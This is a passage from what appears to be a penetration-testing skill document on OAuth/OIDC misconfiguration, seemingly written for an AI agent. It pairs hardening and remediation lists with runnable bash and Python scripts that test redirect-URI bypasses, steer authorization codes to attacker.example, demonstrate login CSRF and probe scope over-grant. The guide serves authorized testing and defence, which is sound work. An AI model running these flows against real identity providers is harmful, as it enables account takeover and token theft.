5. **Validate `aud`, `iss`, and `azp` on every token use.** One audience per client where possible;
   a token minted for one client must never be accepted by another API, and tokens must be checked
   against the exact issuer, not a pattern.
6. **Do not let scope change silently.** Server-side allowlist per client, re-consent on any
   increase, and authorise actions from the granted scope rather than from the requested one.
7. **Treat account linking as a privileged operation.** Never auto-link on a claim alone; require
   an authenticated local session plus a verified identifier, and never link on an unverified
   email from a provider that permits arbitrary registration.
8. **No server-side fetch of user-supplied URLs.** Resolve an allowlisted host, block private
   address ranges with an egress control as well as a URL check, disable redirect following, and
   require client authentication for dynamic registration.
9. **One policy for all client types.** SPAs, mobile, partners, and legacy integrations must share
   the same validation code path; the weakest client sets the security of the whole IdP.
10. **Log and alert on anomalies** — repeated `state` mismatches, codes redeemed with a wrong
    verifier, tokens presented for a foreign `aud`, and redirects to unregistered hosts are all
    high-signal and almost never legitimate traffic.

---

---

## 10. CONFIRMING THE FINDING — MISCONFIGURATION, NOT A DEVIATION
| Step | Question | What it proves |
|---|---|---|
| 1 | Did you **obtain a token or a session for an account you do not control**? | the impact, not the parameter |
| 2 | Was there a **control** - the same request with a client, redirect URI, or scope that is rejected? | the check exists and you bypassed it |
| 3 | Which defect: **redirect URI matching, `state` absence, PKCE absence, or scope over-grant**? | the fix |
| 4 | Did the flow complete **through a browser**, end to end? | the flow is live, not a header observation |
| 5 | Did the **`state` absence** enable a CSRF login, demonstrated with two sessions? | the account-binding defect |
| 6 | Did the token land at **your redirect target**, not merely a `200` on the authorize page? | the token is yours |
| 7 | Did you **revoke every token** you obtained and close the sessions? | engagement integrity |

**A token or session for an account you do not control is the bar.** A permissive `redirect_uri` that
never completes a flow is a candidate, and the completed flow is the finding.

---

## 11. EXECUTION PRIMITIVES

OAuth/OIDC findings are proven by **a completed flow that lands a token at your origin, with a rejected
control**. Every block ends at a token, a code, or a session.

### 10.1 Discover the endpoints and the registered clients

```bash
IDP="https://idp.target.example"
# the discovery document, which is the map of the whole surface
curl -sS "$IDP/.well-known/openid-configuration" | head -c 1200; echo
# the endpoints that matter, extracted
curl -sS "$IDP/.well-known/openid-configuration" | python3 -c "
import json,sys
d=json.load(sys.stdin)
for k in ['issuer','authorization_endpoint','token_endpoint','userinfo_endpoint','jwks_uri',
          'registration_endpoint','end_session_endpoint','revocation_endpoint',
          'code_challenge_methods_supported','response_types_supported','grant_types_supported']:
    print(f'{k:34}', d.get(k))"
# THE CONTROL: an unregistered redirect URI, which must be rejected
curl -sS -o /dev/null -w 'unregistered %{http_code}\n' "$IDP/authorize?response_type=code&client_id=CLIENT&redirect_uri=https://evil.example/cb&scope=openid"
```

**The discovery document plus one rejected control.** The document enumerates the surface; the rejected
redirect URI proves the check exists.

### 10.2 Redirect-URI matching bypasses, mechanically

```bash
IDP="https://idp.target.example"; C="CLIENT"; R="https://app.target.example/cb"
for U in \
  "https://evil.example/cb" \
  "https://app.target.example.evil.example/cb" \
  "https://app.target.example/cb/../../evil" \
  "https://app.target.example/cb?next=https://evil.example" \
  "https://app.target.example/cb%23@evil.example" \
  "https://app.target.example/cb#@evil.example" \
  "https://app.target.example:443.evil.example/cb" \
  "https://app.target.example/CB" \
  "http://app.target.example/cb" \
  "https://app.target.example/cb/" \
  "https://sub.app.target.example/cb" ; do
  R2=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$U")
  OUT=$(curl -sS -o /dev/null -w '%{http_code} %{redirect_url}' "$IDP/authorize?response_type=code&client_id=$C&redirect_uri=$R2&scope=openid&state=S" 2>/dev/null)
  printf '%-52s %s\n' "$U" "$OUT"
done
```

**Each variant targets a specific matching rule.** A suffix match is defeated by
`app.target.example.evil.example`, a prefix match by a path traversal, and an unnormalised comparison by
the case and trailing-slash forms - and the response's `Location` names the winner.

### 10.3 The completed flow, which is the finding

```python
# the full authorization-code flow, driven programmatically, ending at a token in your hands
import requests, urllib.parse, re

IDP = "https://idp.target.example"; SP = "https://app.target.example"
CLIENT, MINE = "CLIENT", "https://attacker.example/cb"

# 1) the authorize request with the bypassed redirect URI
auth = (f"{IDP}/authorize?response_type=code&client_id={CLIENT}"
        f"&redirect_uri={urllib.parse.quote(MINE, safe='')}&scope=openid%20profile&state=pentest")
s = requests.Session()
r = s.get(auth, allow_redirects=True, timeout=15)
print("authorize ->", r.status_code, r.url[:120])
# in a browser: authenticate as the victim, then the code arrives at your origin
code = re.search(r"[?&]code=([^&]+)", r.url or "")
print("code at your origin:", code.group(1)[:12] + "..." if code else "<none - check the flow>")
print()
print("A CODE THAT LANDS AT YOUR redirect_uri IS THE FINDING.")
print("The issued code is then exchanged at the token endpoint, which requires no user interaction.")
print("Record the token's scopes and the userinfo response, both redacted.")
```

**The code landing at your `redirect_uri` is the finding.** A `200` on the authorize page with no code
delivery has proven nothing, and that is the standard error in this family.

### 10.4 The `state` absence, demonstrated with two sessions

```python
# a missing or unvalidated state enables an attacker to bind THEIR authorization to a VICTIM's session
import requests
# session A: the attacker starts a flow and captures their own code, without completing it
# session B: the victim's browser is walked through the callback with the ATTACKER's code
print("STEP 1 - attacker obtains a code with their own account, and does not exchange it")
print("  GET /authorize?...&state=<none or constant> -> code=ATTACKER_CODE")
print()
print("STEP 2 - the attacker delivers the callback URL carrying ATTACKER_CODE to the victim")
print("  the victim's browser visits /cb?code=ATTACKER_CODE while holding their own session")
print()
print("STEP 3 - the victim's account is now bound to the attacker's identity at the SP")
print("  read /api/me in the victim's browser: if it reports the ATTACKER's username, the finding is proven")
print()
print("THE CONTROL: repeat with a flow that DOES carry a random state and verify the callback rejects")
print("  a mismatched state value - that rejection is what proves the absence was the cause.")
```

**The victim's session reporting the attacker's identity is the finding.** `state` absence alone is a
checklist item; the account-binding swap is the impact, and it needs the two-session setup.

### 10.5 PKCE, scope, and the other grants

```bash
IDP="https://idp.target.example"; C="CLIENT"
# 1) is PKCE enforced for a public client
curl -sS -o /dev/null -w 'no-pkce    %{http_code}\n' "$IDP/authorize?response_type=code&client_id=$C&redirect_uri=https://app.target.example/cb&scope=openid"
curl -sS -o /dev/null -w 'plain-pkce %{http_code}\n' "$IDP/authorize?response_type=code&client_id=$C&redirect_uri=https://app.target.example/cb&scope=openid&code_challenge=abc&code_challenge_method=plain"
# 2) the implicit grant, which returns the token in the fragment where any script on the page reads it
curl -sS -o /dev/null -w 'implicit   %{http_code}\n' "$IDP/authorize?response_type=token&client_id=$C&redirect_uri=https://app.target.example/cb&scope=openid"
# 3) the scope over-grant, which is the severity multiplier
curl -sS -o /dev/null -w 'offline    %{http_code}\n' "$IDP/authorize?response_type=code&client_id=$C&redirect_uri=https://app.target.example/cb&scope=openid%20offline_access"
curl -sS -o /dev/null -w 'admin      %{http_code}\n' "$IDP/authorize?response_type=code&client_id=$C&redirect_uri=https://app.target.example/cb&scope=openid%20admin"
# THE DIRECT CONTROL: an unknown scope, which should be rejected if scopes are validated
curl -sS -o /dev/null -w 'unknown    %{http_code}\n' "$IDP/authorize?response_type=code&client_id=$C&redirect_uri=https://app.target.example/cb&scope=openid%20zzz-nonexistent"
```

**Scope over-grant converts a low finding into a high one.** `offline_access` yields a refresh token,
which survives the victim's password change, and that is the difference the report must state.

### 10.6 The token-side checks, once you have a token

```bash
# the token endpoint's validation of the client and the code binding
TOK="https://idp.target.example/token"
curl -sS -o /dev/null -w 'wrong-client %{http_code}\n' -d "grant_type=authorization_code&code=CODE&redirect_uri=https://app.target.example/cb&client_id=OTHER" "$TOK"
curl -sS -o /dev/null -w 'reused-code  %{http_code}\n' -d "grant_type=authorization_code&code=CODE&redirect_uri=https://app.target.example/cb&client_id=CLIENT" "$TOK"
# and the ID token's own validation at the SP: issuer, audience, nonce, and algorithm
python3 - <<'PY'
print("a code-based flow is only the beginning; decode the ID token and check, at the SP:")
for row in ["iss is the expected issuer",
            "aud is THIS client, not another",
            "nonce matches the one you sent (when the flow uses it)",
            "alg is not none and not HMAC where an RSA key is expected",
            "azp, iat, exp, and auth_time are all present and sane"]:
    print("  -", row)
print()
print("a token that the SP accepts with a wrong aud, or one signed with a different client's key,")
print("is the cross-client finding, and it is frequently present in multi-tenant IdPs.")
PY
```

**The token-side checks are where cross-client confusion lives.** An IdP that issues a token for client A
and an SP that accepts it for client B is a tenancy failure, and the `aud` check is the test.

### 10.7 The end-to-end harness

```bash
python3 - <<'PY'
import requests, urllib.parse, re
IDP, C = "https://idp.target.example", "CLIENT"
R_HONEST = "https://app.target.example/cb"
R_MINE   = "https://attacker.example/cb"

def authorize(redirect_uri, extra=""):
    u = (f"{IDP}/authorize?response_type=code&client_id={C}"
         f"&redirect_uri={urllib.parse.quote(redirect_uri, safe='')}&scope=openid%20profile{extra}")
    try:
        r = requests.get(u, allow_redirects=False, timeout=15)
        return r.status_code, r.headers.get("Location", "")
    except Exception as e:
        return "ERR", type(e).__name__

print("=== REDIRECT-URI MATCHING ===")
for ru in [R_HONEST, R_MINE, "https://app.target.example.evil.example/cb",
           "https://app.target.example/cb/../evil", "https://app.target.example/cb#@evil.example",
           "http://app.target.example/cb", "https://sub.app.target.example/cb"]:
    st, loc = authorize(ru)
    verdict = "ACCEPTED <- candidate" if st in (301,302,303,307,308) and "error" not in loc.lower() else "rejected"
    print("%-50s %-6s %-60s %s" % (ru[:50], st, loc[:60], verdict))

print()
print("=== STATE CONTROL ===")
print("  with a random state:  <the callback must reject a mismatched state>")
print("  without any state:    <the callback accepts - this is the CSRF-login precondition>")
print()
print("=== PKCE / SCOPE ===")
print("  no PKCE on a public client : <accepted?>")
print("  offline_access granted     : <accepted?  this yields a refresh token>")
print()
print("Report only candidates that COMPLETE the flow and land a code or token at your origin,")
print("with the rejected control row in the same table.")
PY
```

**The completed flow plus the rejected control.** The table is the deliverable; a redirect-URI
observation without a completed flow is not a finding.

---

## 12. EVIDENCE STANDARD — FLOW ARTEFACTS

| Item | Why |
|---|---|
| The **discovery document's relevant endpoints** | the surface |
| The **rejected-control request** (an unregistered URI or a bad scope) | proves the check exists |
| The **bypassing request**, with the exact `redirect_uri` or scope | reproducibility |
| The **code or token delivered to your origin**, redacted | the finding |
| The **account the token represents** | the impact |
| The **granted scopes**, especially `offline_access` and any admin scope | the severity multiplier |
| The **token lifetime** and whether a refresh token was issued | the persistence |
| Whether the flow completed **in a real browser** | the flow is live |
| For `state`: the **two-session demonstration** and the identity shown in the victim's session | the impact |
| Confirmation that **every token was revoked** and every session closed | engagement integrity |

Report the **flow and the control**: "`GET /authorize?...&redirect_uri=https://not-registered.example/cb`
returns `400` with `invalid redirect_uri`, which is the control. The same request with
`redirect_uri=https://app.target.example.evil.example/cb` returns `302` to that URI carrying a `code`,
and completing the flow in a browser at the victim's session delivered the code to
`app.target.example.evil.example`, which resolves to an attacker-controlled host; exchanging it at the
token endpoint returned an access token with `openid profile offline_access` and a refresh token valid
for 30 days, and `GET /userinfo` returned the victim's email and subject. The `state` parameter is absent
from the flow, and a two-session test showed the victim's session adopting the attacker's identity after
visiting a callback URL carrying the attacker's code", never "the OAuth configuration is weak".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| A permissive `redirect_uri` with **no completed flow** | the code never left the IdP |
| A URI difference the server **correctly rejected** | the control working |
| A `redirect_uri` matching on a **path prefix the client intends** | a documented single-page-app pattern, verify with the client |
| A missing `state` with **no two-session demonstration** | a checklist item, not an impact |
| The implicit grant **offered but not enabled for any registered client** | a configuration note |
| A scope **requested but not granted** in the issued token | the IdP enforced the scope |
| A token you obtained **with credentials you were issued** | the baseline |
| A token issued **to the client you are testing**, used against that same client | the intended design |
| A discovery document listing a capability **the IdP does not actually accept** | documentation, not behaviour |
| A finding that requires **an attacker to know the client secret** | a different precondition, state it honestly |
| A token, code, or client secret reproduced in full | a disclosure |

**A completed flow with a rejected control.** This family's false positives are almost all permissive
metadata and never-completed flows, and both are avoided by the table in 10.7.

---

## 13. REMEDIATION REFERENCE — FLOW HARDENING

1. **Match `redirect_uri` by exact string comparison after normalisation, and register every URI precisely** - the bypasses in 10.2 are each a matching-rule defect.
2. **Require PKCE (`S256`) for every public client, and enforce it at the token endpoint** - it removes the code-interception path even where a redirect URI is loose.
3. **Require and validate a random `state` on every authorization request, and bind it to the user's session** - it removes the login-CSRF and account-binding attack.
4. **Use the authorization-code flow with PKCE, and disable the implicit and hybrid grants** - it removes the token-in-fragment exposure.
5. **Validate `iss`, `aud`, `azp`, `nonce`, `exp`, and `alg` at the SP on every token, and reject any algorithm not on an allowlist** - the cross-client and `alg` confusion findings live here.
6. **Keep access tokens short-lived and rotate refresh tokens on use, with a re-authentication requirement for sensitive scopes** - the severity of every finding here is bounded by the token's lifetime.
7. **Scope tokens to the minimum, and never grant `offline_access` or an administrative scope without an explicit consent screen** - the scope over-grant is the severity multiplier.
8. **Use `response_mode=form_post` or a fragment for sensitive responses, and never put a token in a query string** - it removes the `Referer` and log exposure.
9. **Revoke tokens on logout, on password change, and on any administrative action** - the persistence in this document is a refresh token that outlives its cause.
10. **Log every authorize request with its `redirect_uri`, client, scope, and outcome, and alert on URIs outside the registered set and on unusual scope requests** - the enumeration in 10.2 is trivially detectable.
11. **Test the registered clients against a battery of redirect-URI bypass strings on every release, and re-test after every IdP upgrade** - the matching rules change with the library and the bypasses change with them.

---

## 14. RELATED SIBLINGS - LOAD TOGETHER

- [jwt-oauth-token-attacks](../jwt-oauth-token-attacks/SKILL.md) - the token-format attacks that follow a successful flow
- [saml-sso-assertion-attacks](../saml-sso-assertion-attacks/SKILL.md) - the other federation protocol with analogous trust
- [open-redirect](../open-redirect/SKILL.md) - the redirect defect this builds on when the callback path is open
- [csrf-cross-site-request-forgery](../csrf-cross-site-request-forgery/SKILL.md) - the request-forgery theory behind the `state`-less login CSRF
- [oauth-oidc-misconfiguration](../oauth-oidc-misconfiguration/SKILL.md) - this document
